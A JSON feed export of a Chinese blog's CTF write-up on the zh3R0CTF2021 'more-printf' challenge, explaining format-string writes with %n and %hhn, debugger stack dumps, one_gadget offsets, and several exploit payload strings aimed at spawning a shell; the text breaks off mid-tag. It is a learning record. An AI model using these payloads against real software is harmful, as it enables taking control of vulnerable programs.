{
    "version": "https://jsonfeed.org/version/1",
    "title": "唐仔橙 • All posts by \"pwn\" category",
    "description": "喜欢探索世界,在读研究生,计算机爱好者的成长记录",
    "home_page_url": "https://tangzichengcc.github.io",
    "items": [
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/",
            "title": "pwn入门-47-zh3R0CTF2021-moreprintf",
            "date_published": "2023-11-12T15:40:29.000Z",
            "content_html": "<p>这个题还有一些奇奇怪怪的问题, 但是怕自己跑偏了,就暂时先放下了,后面有空再研究.(或许和fprintf的机制有关?</p>\n<p>​\t先复习一下格式化字符串,本来想看看之前自己写的笔记…看了一下后想起来了一句名言,大意就是你去修改一个很烂的项目不如重构….恩….写的太烂了…不如重写一篇…</p>\n<h1 id=\"格式化字符串漏洞基础\"><a href=\"#格式化字符串漏洞基础\" class=\"headerlink\" title=\"格式化字符串漏洞基础\"></a>格式化字符串漏洞基础</h1><h2 id=\"n\"><a href=\"#n\" class=\"headerlink\" title=\"%n\"></a>%n</h2><p>​\t为什么能写入值呢,就是这个%n,它是将之前已经打印的字符个数赋值给当前偏移处的指针指向的地址</p>\n<p>​\t例如%100×10$n: 将100写入第十个位置所保存的指针指向的地址(4字节), %$hn是2字节,%$hhn是1字节,%$lln是8字节</p>\n<h2 id=\"p\"><a href=\"#p\" class=\"headerlink\" title=\"%p\"></a>%p</h2><p>​\t%p %p %p %p %p %p %p %p %p %p </p>\n<p>​\t在b *fprintf+143也就是vprintf下断点,然后set $rdi&#x3D;_IO_stdout, 单步,就可以打印地址了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">*RSI  <span class=\"number\">0x55555555b4c0</span> ◂— <span class=\"string\">&#x27;0x55555555b260 0x7ffff7af2151 0x7ffff7dcf8c0 0x7ffff7ff5540 0x7fffffffe470 0xb1dad8e32f5ad200 0x5555555552c0 0x7ffff7a03bf7 0x1 0x7fffffffe568\\n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t前四个值和后四个值</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231112234114271.png\" alt=\"image-20231112234114271\"></p>\n<h2 id=\"c\"><a href=\"#c\" class=\"headerlink\" title=\"%c\"></a>%c</h2><p>​\tc是一个字符的意思, 在后面的exp中,%c%c%c%5c%hhn表示,前三次输出,都是输出一个字符,第四次是5个字符,然后一共是8个字节了,把8写入第5个位置的指针指向的地址.</p>\n<p>​\tset $rdi&#x3D;_IO_stdout  ( 其他版本呢?)</p>\n<p>​\t%caaa%cbbb%cccc%5cddd%hhn,</p>\n<p>​\t可以看到确实只打印了第一个字符,然后%5c是把不足的用空格补齐</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`aaaQbbb�ccc    @ddd</span><br></pre></td></tr></table></figure>\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-04-22.jpg\" alt=\"Snipaste_2023-11-08_20-04-22\" style=\"zoom:50%;\">\n\n\n\n<p>​\t然后把值写到了第5个位置的指针指向的地址</p>\n<p>​\t用%c%c%c%5c%hhn试一下, 可以看到确实是改成了0x08</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/Snipaste_2023-11-08_20-09-31.jpg\" alt=\"Snipaste_2023-11-08_20-09-31\" style=\"zoom:50%;\">\n\n<p>​\t但在我这里应该是要改成0xc8 不过其实应该没影响,都是把read地方的值改成onegadget</p>\n<h3 id=\"任意地址写修改值\"><a href=\"#任意地址写修改值\" class=\"headerlink\" title=\"任意地址写修改值\"></a>任意地址写修改值</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%c%c%c%<span class=\"number\">5</span>c%hhn%*<span class=\"number\">8</span>$d%<span class=\"number\">186326</span>c%<span class=\"number\">5</span>$n</span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<p>​\t除了wp给的payload,换其他的很多都不行…为什么呢?? 仔细观察源码, <strong>有输入长度的限制的</strong>,  fgets(buffer, 31, stdin); </p>\n<p>​\t如果不是单纯做题而是研究一下打法的话,可以拓展一下长度试试,这样的话应该就好很多,(可以加系统调用限制,然后又是orw的一道题(x)) (或者直接在运行的时候改寄存器,修改读入长度)</p>\n<h4 id=\"修改ret返回值-x\"><a href=\"#修改ret返回值-x\" class=\"headerlink\" title=\"修改ret返回值(x)\"></a>修改ret返回值(x)</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>a:<span class=\"number\">00</span>d0│     <span class=\"number\">0x7fffffffe4a0</span> —▸ <span class=\"number\">0x555555555100</span> (_start) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1b</span>:<span class=\"number\">00</span>d8│     <span class=\"number\">0x7fffffffe4a8</span> —▸ <span class=\"number\">0x5555555552af</span> (main+<span class=\"number\">198</span>) ◂— mov edi, <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">1</span>c:<span class=\"number\">00e0</span>│     <span class=\"number\">0x7fffffffe4b0</span> ◂— <span class=\"number\">0x7fffffffe4b0</span></span><br><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">00e8</span>│     <span class=\"number\">0x7fffffffe4b8</span> ◂— <span class=\"number\">0xb8204e953bb68d00</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">00f</span>0│ rbp <span class=\"number\">0x7fffffffe4c0</span> —▸ <span class=\"number\">0x5555555552c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│     <span class=\"number\">0x7fffffffe4c8</span> —▸ <span class=\"number\">0x7ffff7a03c87</span> (__libc_start_main+<span class=\"number\">231</span>) ◂— mov edi, eax</span><br><span class=\"line\">    </span><br><span class=\"line\">%c%c%c%<span class=\"number\">197</span>c%hhn%*<span class=\"number\">8</span>$d%????c%<span class=\"number\">5</span>$n</span><br></pre></td></tr></table></figure>\n\n\n\n<p>onegadget - (200 + 0x21c87 )就是要改的值了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x4f2a5</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x40</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  rsp &amp; <span class=\"number\">0xf</span> == <span class=\"number\">0</span></span><br><span class=\"line\">  rcx == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x4f302</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x40</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x40</span>] == <span class=\"literal\">NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x10a2fc</span> execve(<span class=\"string\">&quot;/bin/sh&quot;</span>, rsp+<span class=\"number\">0x70</span>, environ)</span><br><span class=\"line\">constraints:</span><br><span class=\"line\">  [rsp+<span class=\"number\">0x70</span>] == <span class=\"literal\">NULL</span></span><br></pre></td></tr></table></figure>\n\n<p>0x4f2a5- (200 + 0x21c87 ) &#x3D; 185686</p>\n<p>%c%c%c%197c%hhn%*8$d%185686c%5$n</p>\n<p>邪门,就是不出c8,概率比较小,可能和系统有关?</p>\n<p>改成0x18吧…</p>\n<p>%c%c%c%21c%hhn%*8$d%185862c%5$n</p>\n<p>但还是不行..</p>\n<p>问题出在这个函数没有ret的….那….. 所以覆盖了也没用…</p>\n<p>fprintf之后有ret 回main函数的exit, 是不是可以修改这里呢? 这里就是下面的main+198</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231116172117205.png\" alt=\"image-20231116172117205\"></p>\n<h4 id=\"改其他的函数指针-比如改main-198\"><a href=\"#改其他的函数指针-比如改main-198\" class=\"headerlink\" title=\"改其他的函数指针,比如改main+198\"></a>改其他的函数指针,比如改main+198</h4><p>0x556fe88e42af这里会执行到的,但是是把这里的值改了(用watch下断点查看)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>a:<span class=\"number\">00</span>d0│     <span class=\"number\">0x7ffca5108380</span> —▸ <span class=\"number\">0x556fe88e4100</span> (_start) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1b</span>:<span class=\"number\">00</span>d8│     <span class=\"number\">0x7ffca5108388</span> —▸ <span class=\"number\">0x556fe88e42af</span> (main+<span class=\"number\">198</span>) ◂— mov edi, <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"number\">1</span>c:<span class=\"number\">00e0</span>│     <span class=\"number\">0x7ffca5108390</span> ◂— <span class=\"number\">0x7ffca5108390</span></span><br><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">00e8</span>│     <span class=\"number\">0x7ffca5108398</span> ◂— <span class=\"number\">0x695c632b96376d00</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">00f</span>0│ rbp <span class=\"number\">0x7ffca51083a0</span> —▸ <span class=\"number\">0x556fe88e42c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│     <span class=\"number\">0x7ffca51083a8</span> —▸ <span class=\"number\">0x7fc96c879c87</span> (__libc_start_main+<span class=\"number\">231</span>) ◂— mov edi, eax</span><br></pre></td></tr></table></figure>\n\n\n\n<p>修改下内存测试下</p>\n<p>0x7f8d3724c000+0x4f2a5  &#x3D; 0x7f8d3729b2a5</p>\n<p>set *0x7ffc28b196d8&#x3D; 0x7f8d3729b2a5 (为啥一次设置不全呢?)</p>\n<p>set *0x7ffc28b196dc&#x3D; 0x7f8d</p>\n<p>这里会把这个值修改一下,但不知道后面会不会执行, 会执行!!!</p>\n<p>0x18: %c%c%c%21c%hhn%*8$d%185862c%5$n</p>\n<p>0x28: %c%c%c%37c%hhn%*8$d%185846c%5$n</p>\n<p> 但是没办法一次改完….得两次啊,不对,应该用%lln</p>\n<p>0x18: %c%c%c%21c%hhn%*8$d%185862c%5$lln</p>\n<p>0x28: %c%c%c%37c%hhn%*8$d%185846c%5$lln</p>\n<p>不过为什么好像没有改成8字节,还是4字节呢?</p>\n<p>以及,是否可以修改两次4字节呢… 方法有点多,但会越来越复杂…先暂时放一下</p>\n<h2 id=\"如何确定能到read\"><a href=\"#如何确定能到read\" class=\"headerlink\" title=\"如何确定能到read\"></a>如何确定能到read</h2><p>​\t那就算修改了read, 怎么确定一定会执行到read呢, 不是执行到read,而是执行到栈里的这个地方,把那里的值改了,看wp一头雾水,wp中的调用链在本地测试不是这样</p>\n<p>​\t<font color=\"red\">所以我感觉有几份就是瞎扯淡,瞎蒙的(不过也可能是自己认识不足</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-47-zh3R0CTF2021-moreprintf/image-20231108230705755.png\" alt=\"image-20231108230705755\"></p>\n<p>​\t是在vprift里面触发的</p>\n<p>​\t哦卧槽,这和栈的结构有关….?? 为什么返回地址会到这呢??</p>\n<p>​\t改rsp上面那个值才行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>c:<span class=\"number\">00e0</span>│     <span class=\"number\">0x7ffd959070f0</span> —▸ <span class=\"number\">0x7ffd95907008</span> ◂— <span class=\"number\">0x7f2523745be7</span></span><br><span class=\"line\"><span class=\"number\">1</span>d:<span class=\"number\">00e8</span>│     <span class=\"number\">0x7ffd959070f8</span> ◂— <span class=\"number\">0xbaa72d067a954f00</span></span><br><span class=\"line\"><span class=\"number\">1</span>e:<span class=\"number\">00f</span>0│ rbp <span class=\"number\">0x7ffd95907100</span> —▸ <span class=\"number\">0x562fc10992c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">1f</span>:<span class=\"number\">00f</span>8│     <span class=\"number\">0x7ffd95907108</span> —▸ <span class=\"number\">0x7f25dc8e7bf7</span> (__libc_start_main+<span class=\"number\">231</span>) ◂— mov edi, eax</span><br><span class=\"line\">pwndbg&gt; bt</span><br><span class=\"line\">#<span class=\"number\">0</span>  <span class=\"number\">0x00007f2523745be7</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">1</span>  <span class=\"number\">0x0000003000000030</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">2</span>  <span class=\"number\">0x00007ffd959070f8</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">3</span>  <span class=\"number\">0x00007ffd95907030</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">4</span>  <span class=\"number\">0xbaa72d067a954f00</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">5</span>  <span class=\"number\">0x00007f25dccb1a00</span> in ?? () from ./libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">#<span class=\"number\">6</span>  <span class=\"number\">0x00007f25dccae2a0</span> in ?? () from ./libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">#<span class=\"number\">7</span>  <span class=\"number\">0x0000562fc300d260</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">8</span>  <span class=\"number\">0x00007f25dc9d6151</span> in __GI___libc_read (fd=<span class=\"number\">-1785699856</span>, buf=<span class=\"number\">0x562fc300d27e</span>, nbytes=<span class=\"number\">0</span>) at ../sysdeps/unix/sysv/linux/read.c:<span class=\"number\">27</span></span><br><span class=\"line\">#<span class=\"number\">9</span>  <span class=\"number\">0x00007f25dccb38c0</span> in _IO_stdfile_2_lock () from ./libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">#<span class=\"number\">10</span> <span class=\"number\">0x00007f25dcedf540</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">11</span> <span class=\"number\">0xffffffffffffffb0</span> in ?? ()</span><br><span class=\"line\">#<span class=\"number\">12</span> <span class=\"number\">0x0000000000000000</span> in ?? ()</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">pwndbg&gt; tele $rsp<span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│     <span class=\"number\">0x7ffd95907000</span> —▸ <span class=\"number\">0x7ffd95907100</span> —▸ <span class=\"number\">0x562fc10992c0</span> (__libc_csu_init) ◂— endbr64</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0x7ffd95907008</span> ◂— <span class=\"number\">0x7f2523745be7</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│ rsp <span class=\"number\">0x7ffd95907010</span> ◂— <span class=\"number\">0x3000000030</span> <span class=\"comment\">/* &#x27;0&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7ffd95907018</span> —▸ <span class=\"number\">0x7ffd959070f8</span> ◂— <span class=\"number\">0xbaa72d067a954f00</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│     <span class=\"number\">0x7ffd95907020</span> —▸ <span class=\"number\">0x7ffd95907030</span> —▸ <span class=\"number\">0x7f25dccb1a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│     <span class=\"number\">0x7ffd95907028</span> ◂— <span class=\"number\">0xbaa72d067a954f00</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│     <span class=\"number\">0x7ffd95907030</span> —▸ <span class=\"number\">0x7f25dccb1a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│     <span class=\"number\">0x7ffd95907038</span> —▸ <span class=\"number\">0x7f25dccae2a0</span> (__GI__IO_file_jumps) ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tele $rsp<span class=\"number\">-0x8</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│     <span class=\"number\">0x7ffea6ecc4b8</span> —▸ <span class=\"number\">0x7fa5e518df44</span> (<span class=\"built_in\">fprintf</span>+<span class=\"number\">148</span>) ◂— mov rcx, qword ptr [rsp + <span class=\"number\">0x18</span>]</span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│ rsp <span class=\"number\">0x7ffea6ecc4c0</span> ◂— <span class=\"number\">0x3000000030</span> <span class=\"comment\">/* &#x27;0&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0x7ffea6ecc4c8</span> —▸ <span class=\"number\">0x7ffea6ecc5a8</span> ◂— <span class=\"number\">0x3d76d5b605211900</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0x7ffea6ecc4d0</span> —▸ <span class=\"number\">0x7ffea6ecc4e0</span> —▸ <span class=\"number\">0x7fa5e5514a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0020</span>│     <span class=\"number\">0x7ffea6ecc4d8</span> ◂— <span class=\"number\">0x3d76d5b605211900</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0028</span>│     <span class=\"number\">0x7ffea6ecc4e0</span> —▸ <span class=\"number\">0x7fa5e5514a00</span> (_IO_2_1_stdin_) ◂— <span class=\"number\">0xfbad208b</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0030</span>│     <span class=\"number\">0x7ffea6ecc4e8</span> —▸ <span class=\"number\">0x7fa5e55112a0</span> (__GI__IO_file_jumps) ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">0038</span>│     <span class=\"number\">0x7ffea6ecc4f0</span> —▸ <span class=\"number\">0x55e932c72260</span> ◂— <span class=\"string\">&#x27;%c%c%c%5c%hhn%*8$d%186326c%5$n&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h1><h2 id=\"源代码\"><a href=\"#源代码\" class=\"headerlink\" title=\"源代码\"></a>源代码</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* gcc -o more-printf -fstack-protector-all more-printf.c */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">FILE *fp;</span><br><span class=\"line\"><span class=\"type\">char</span> *buffer;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> i = <span class=\"number\">0x8d9e7e558877</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">_Noreturn</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">/* Just to save some of your time */</span></span><br><span class=\"line\">  <span class=\"type\">uint64_t</span> *p;</span><br><span class=\"line\">  p = &amp;p;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Chall */</span></span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  buffer = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span> + <span class=\"number\">1</span>); <span class=\"comment\">//为啥要+1? 感觉好像不加也一样</span></span><br><span class=\"line\">  fp = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">  fgets(buffer, <span class=\"number\">0x1f</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (i != <span class=\"number\">0x8d9e7e558877</span>) &#123;</span><br><span class=\"line\">    _exit(<span class=\"number\">1337</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    i = <span class=\"number\">1337</span>;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(fp, buffer);</span><br><span class=\"line\">    _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"逻辑分析\"><a href=\"#逻辑分析\" class=\"headerlink\" title=\"逻辑分析\"></a>逻辑分析</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v3[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3[<span class=\"number\">1</span>] = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v3[<span class=\"number\">0</span>] = (__int64)v3;</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  buffer = (<span class=\"type\">char</span> *)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>uLL);</span><br><span class=\"line\">  fp = fopen(<span class=\"string\">&quot;/dev/null&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>);</span><br><span class=\"line\">  fgets(buffer, <span class=\"number\">31</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( i != <span class=\"number\">0x8D9E7E558877</span>LL )</span><br><span class=\"line\">    _exit(<span class=\"number\">1337</span>);</span><br><span class=\"line\">  i = <span class=\"number\">1337LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(fp, buffer);</span><br><span class=\"line\">  _exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t能够看到没有溢出,有一次格式化字符串利用的机会, 我在想是不是可以直接把返回地址修改成onegadget呢? 答案没采用这种方法,<strong>后面证实确实不行,一个是没有ret, 换别的函数的ret没有合适的指针(存疑)</strong></p>\n<p>​\t先用%p泄露地址,能够看到第二个地址是比较特殊的, read函数,如果可以修改后面几个字节, 改为和onegadget一样,通过枚举,alsr偏移也一样的话,就可以getshell了,onegadget的话 0x4f3d5, 有五位不同, 枚举的话还是需要挺长时间的.. (不需要通过枚举,完全可以利用现有的指针),也就是第8个参数</p>\n<p>​\t__libc_start_main+231知道这里的值,加上偏移就是onegadget的值了!</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__libc_start_main+<span class=\"number\">231</span>: <span class=\"number\">0x7ffff7a03bf7</span></span><br><span class=\"line\">onegadget : <span class=\"number\">0x7ffff7a313d5</span></span><br><span class=\"line\">相差: onegadget-__libc_start_main+<span class=\"number\">231</span> = <span class=\"number\">0x2d7de</span> = <span class=\"number\">186334</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>​\t<font color=\"red\">作者认为修改的read+17这个值是修改完后才会执行到的…依据是什么呢,如果不是这样的呢?</font></p>\n<p>​\t下断点: b *read 下不了…q</p>\n<p>​\t要输入payload: %c%c%c%5c%hhn%*8$d%186326c%5$n\t也不行</p>\n<p>​\t</p>\n<p>​\t可以下watch断点的, watch一下要修改的地方的地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; info b</span><br><span class=\"line\">Num     Type           Disp Enb Address            What</span><br><span class=\"line\"><span class=\"number\">7</span>       breakpoint     keep y   <span class=\"number\">0x00007ffff7a46f3f</span> in __fprintf at <span class=\"built_in\">fprintf</span>.c:<span class=\"number\">32</span></span><br><span class=\"line\">\tbreakpoint already hit <span class=\"number\">1</span> time</span><br><span class=\"line\"><span class=\"number\">9</span>       breakpoint     keep n   <span class=\"number\">0x00007ffff7af2140</span> in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:<span class=\"number\">27</span></span><br><span class=\"line\"><span class=\"number\">11</span>      breakpoint     keep y   <span class=\"number\">0x00007ffff7af2140</span> in __GI___libc_read at ../sysdeps/unix/sysv/linux/read.c:<span class=\"number\">27</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>下的断点没用呢… 换个patchelf试试,</p>\n<p>2.27-3ubuntu1.4</p>\n<p><a 